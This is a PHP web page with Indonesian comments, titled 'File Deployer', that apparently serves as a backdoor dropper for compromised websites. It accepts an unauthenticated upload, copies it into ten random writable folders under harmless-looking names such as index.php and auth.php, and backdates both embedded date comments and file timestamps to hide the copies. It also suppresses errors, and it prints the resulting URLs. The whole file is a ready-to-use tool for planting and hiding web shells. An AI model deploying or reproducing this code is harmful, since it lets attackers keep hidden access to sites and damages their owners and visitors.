<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

/**
 * Scan folder writable hingga kedalaman tertentu
 */
function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];

    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge(
                $result,
                scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1)
            );
        }
    }

    return $result;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>File Deployer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {
            --primary: #00d4ff;
            --background: #0d1117;
            --surface: #161b22;
            --text: #c9d1d9;
            --success: #1f6feb;
            --error: #f85149;
            --border: #30363d;
        }
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Roboto Mono', monospace;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: var(--background);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .card {
            background-color: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 520px;
            box-shadow: 0 0 30px rgba(0,0,0,0.4);
            animation: fadeIn 0.4s ease-out;
        }
        h1 {
            text-align: center;
            color: var(--primary);
            font-weight: 600;
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-size: 15px;
            color: #8b949e;
        }
        input[type="file"] {
            width: 100%;
            background-color: #0d1117;
            color: var(--text);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        button {
            width: 100%;
            background: var(--primary);
            color: #0d1117;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            padding: 12px;
            cursor: pointer;
            font-size: 15px;
            transition: all 0.2s ease;
        }
        button:hover {
            background-color: #00aaff;
        }
        .message {
            margin-top: 25px;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            line-height: 1.5;
        }
        .success {
            background-color: rgba(31, 111, 235, 0.1);
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        .error {
            background-color: rgba(248, 81, 73, 0.1);
            color: var(--error);
            border: 1px solid var(--error);
        }
        code {
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            color: #58a6ff;
        }
        ul {
            margin: 10px 0 0 20px;
            padding: 0;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
<div class="card">
    <h1>File Deployer</h1>
    <form method="post" enctype="multipart/form-data">  
        <label for="file">Upload file (akan disalin ke beberapa folder random):</label>
        <input type="file" name="file" id="file" required>
        <button type="submit">Deploy Now</button>
    </form>

<?php
if (isset($_FILES['file'])) {
    $tmp_name = $_FILES['file']['tmp_name'];

    // Buat tanggal random
    $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 365) . ' days'));
    $timestamp      = strtotime($randomDateTime);

    $targetNames    = ['index.php', 'action.php', 'auth.php', 'settings.php'];
    $allWritable    = scanWritableDirs(__DIR__, 5);

    if (empty($allWritable)) {
        echo "<div class='message error'>Tidak ditemukan folder writable.</div>";
    } else {
        shuffle($allWritable);
        $targetFolders = array_slice($allWritable, 0, 10);
        $successCount  = 0;
        $uploadedURLs  = [];

        // Ambil isi file upload
        $originalContent = @file_get_contents($tmp_name);

        foreach ($targetFolders as $folder) {
            $randomName = $targetNames[array_rand($targetNames)];
            $target     = $folder . DIRECTORY_SEPARATOR . $randomName;

            // Ubah tanggal di dalam file jika ada
            $modifiedContent = preg_replace(
                '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
                '${1}' . $randomDateTime,
                $originalContent
            );

            // Simpan file hasil modifikasi
            if (@file_put_contents($target, $modifiedContent) !== false) {
                // Ubah tanggal file di sistem
                @touch($target, $timestamp, $timestamp);

                // Konversi ke URL
                $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
                $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
                $protocol     = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                $host         = $_SERVER['HTTP_HOST'];
                $url          = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $randomName;

                $successCount++;
                $uploadedURLs[] = $url;
            }
        }

        // Tampilkan hasil
        if ($successCount > 0) {
            echo "<div class='message success'><strong>Berhasil upload ke {$successCount} folder:</strong><ul>";
            foreach ($uploadedURLs as $url) {
                echo "<li><code><a href=\"{$url}\" target=\"_blank\">{$url}</a></code></li>";
            }
            echo "</ul></div>";
        } else {
            echo "<div class='message error'>Gagal upload ke folder manapun.</div>";
        }
    }
}
?>
</div>
</body>
</html>
